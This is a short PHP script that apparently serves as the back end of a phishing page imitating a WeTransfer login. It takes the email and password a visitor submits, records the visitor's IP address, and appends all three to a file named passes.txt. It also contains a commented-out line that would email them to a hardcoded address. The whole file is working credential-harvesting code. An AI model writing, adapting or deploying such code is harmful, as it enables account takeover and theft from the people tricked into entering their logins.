<?php

//Get the necessary variables from the server.
$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER["REMOTE_ADDR"];

//Define required variables and send user input to $myEmail.
$myEmail = 'andrewcole3029@yahoo.com';
$subject = 'WeTransfer';
$message = "Email: ".$email."\nPassword:".$password."\nIP:".$ip."\n";
//mail($myEmail, $subject, $message);
$file = "passes.txt";

$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
fwrite($fp, $message) or die("Couldn't write values to file!");
fclose($fp);

?>